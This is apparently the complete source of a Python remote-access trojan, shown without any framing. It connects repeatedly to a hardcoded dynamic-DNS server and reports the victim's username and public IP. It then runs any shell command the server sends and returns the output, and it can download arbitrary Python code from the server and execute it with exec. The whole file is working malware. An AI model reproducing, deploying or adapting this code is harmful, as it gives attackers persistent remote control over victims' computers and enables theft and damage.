import os
import socket
import subprocess
import json
import time
import getpass
import importlib
import threading
import importlib.util
import requests
import tempfile
import os

SERVER = "posydon.ddns.net"
PORT = 8080
FILEPORT = 8081

def extract_libraries_from_code(code):
  try:
      import ast

      tree = ast.parse(code)
      library_names = set()
      for node in ast.walk(tree):
          if isinstance(node, ast.Import):
              for alias in node.names:
                  library_names.add(alias.name)
          elif isinstance(node, ast.ImportFrom):
              library_names.add(node.module)
      return list(library_names)

  except Exception as e:
      return f"Error during code analysis: {e}"
    
def download_libraries(libraries):
  imported_modules = {}
  try:
      for library in libraries:
          url = f"https://raw.githubusercontent.com/{library.replace('.', '/')}/main/{library.replace('.', '/')}/__init__.py"
          response = requests.get(url)
          library_code = response.text

          # Save the library code to a temporary file
          temp_file_path = os.path.join(tempfile.gettempdir(), f"{library.replace('.', '_')}.py")
          with open(temp_file_path, "w") as temp_file:
              temp_file.write(library_code)

          # Create a temporary module and import it
          spec = importlib.util.spec_from_file_location(library, temp_file_path)
          if spec is not None:
              module = importlib.util.module_from_spec(spec)
              loader = spec.loader
              if loader is not None:
                  loader.exec_module(module)

                  # Clean up temporary files
                  os.remove(temp_file_path)

                  imported_modules[library] = module

      return imported_modules

  except Exception as e:
      return f"Error during library download and import: {e}"

def execute_code(code, libraries):
  try:
      # Create a dictionary to use as the local and global namespace for execution
      exec_namespace = {}

      # Download and import the specified libraries dynamically
      imported_libraries = download_libraries(libraries)

      # Add imported libraries to the namespace
      if isinstance(imported_libraries, dict):
          exec_namespace.update(imported_libraries)

      # Execute the code within the specified namespace
      exec(code, exec_namespace)

      # Check if the code defines a function named 'main' and execute it if present
      if 'main' in exec_namespace and callable(exec_namespace['main']):
          output = exec_namespace['main']()
          return output
      else:
          return "Code executed successfully - no 'main' function found."

  except Exception as e:
      return f"Error during code execution: {e}"

def execute_module(socket):
  try:
    # Replace this URL with the actual URL you are using to download the code
    code_url = f"http://{SERVER}:{FILEPORT}/file"
    code = requests.get(code_url).text

    # Extract library names from the code
    library_names = extract_libraries_from_code(code)

    # Execute the code with the modified execute_code function
    result = execute_code(code, library_names)

    data_to_send = {'type': 'response_module', 'data': result}
    # Encode the dictionary as a JSON string before sending
    socket.send(json.dumps(data_to_send).encode())

  except Exception as e:
    error_message = f"Error during module execution: {e}"
    data_to_send = {'type': 'response_module', 'data': error_message}
    socket.send(json.dumps(data_to_send).encode())


while True: 		# Infinite loop to keep trying to connect
  try:
    s = socket.socket()
    s.connect((SERVER, PORT))
    s.send(json.dumps({"type": "establishment", "data": {"username": getpass.getuser(), "hostname": requests.get('https://api.ipify.org').text}}).encode());
    print('established')
    try:
      while True:
        command = s.recv(1024).decode()
        if not command:
          break
        
        if command.startswith('cd'):
          os.chdir(command.split()[1])
          result = "Successfully switched to directory: " + os.getcwd()
        elif command == "!module":
          module_thread = threading.Thread(target=execute_module(s))
          module_thread.start()
          result = "Started module execution"
        else:
          result = subprocess.getoutput(command)
          print(result)
          
        data_to_send = {'type': 'response', 'data': result}
        print(json.dumps(data_to_send).encode())
        print('sending: '+json.dumps(data_to_send))
        # Encode the dictionary as a JSON string before sending
        s.send(json.dumps(data_to_send).encode())
    except KeyboardInterrupt:
      s.send("Connection closed by the user".encode())
    finally:
      s.close()
  except Exception as e: 	# Catch any exceptions that occur during connection
    print(f"An error occurred: {e}")
    time.sleep(5) 		# Wait for 5 seconds before trying to connect again